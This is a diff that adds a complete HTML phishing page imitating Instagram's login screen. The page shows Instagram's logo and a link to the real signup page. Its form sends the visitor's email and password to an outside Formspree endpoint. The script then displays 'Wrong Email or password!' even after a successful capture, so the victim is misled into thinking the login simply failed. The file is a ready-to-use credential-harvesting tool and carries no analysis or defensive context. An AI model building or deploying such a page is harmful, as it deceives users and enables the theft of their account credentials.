@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="loginstyle.css">
+    <link rel="icon" type="x-image" href="instagram.jpg">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>instagram</title>
+</head>
+<body>
+    <div class="gener">
+        <div class="box">
+            <img src="1024px-Instagram_logo.svg.png" width="150px" alt="">
+            <form action="https://formspree.io/f/xnqeggob" method="post" id="my-form">
+                <input type="email" placeholder="Email address" name="email" required>
+                <input type="Password" placeholder="Password" name="password" required>
+                <button id="my-form-button">Log in</button>
+                <p id="my-form-status"></p>
+            </form>
+            <br>
+            <a href="">Forgot Password?</a>
+            <br><br><br>
+            <h2>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Signup</a></h2>
+            <div class="applink">
+                <button class="appstore"></button>
+                <button class="playstore"></button>
+            </div>
+        </div>
+    </div>
+    <script>
+        var form = document.getElementById("my-form");
+        let appstore = document.querySelector(".appstore");
+        let playstore = document.querySelector(".playstore");
+        
+        async function handleSubmit(event) {
+          event.preventDefault();
+          var status = document.getElementById("my-form-status");
+          var data = new FormData(event.target);
+          fetch(event.target.action, {
+            method: form.method,
+            body: data,
+            headers: {
+                'Accept': 'application/json'
+            }
+          }).then(response => {
+            if (response.ok) {
+              status.innerHTML = "Wrong Email or password!";
+              form.reset()
+            } else {
+              response.json().then(data => {
+                if (Object.hasOwn(data, 'errors')) {
+                  status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+                } else {
+                  status.innerHTML = "Check your credentials and try again"
+                }
+              })
+            }
+          }).catch(error => {
+            status.innerHTML = "Check your credentials and try again"
+          });
+        }
+        form.addEventListener("submit", handleSubmit)
+        playstore.addEventListener('click', ()=>{
+            window.location = "https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D5729C2BA-1626-4B8B-841C-239F19B75811%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps://www.bing.com/&pli=1"
+        })
+        appstore.addEventListener('click', () =>{
+            window.location = ""
+        })
+      </script>
+</body>
+</html>
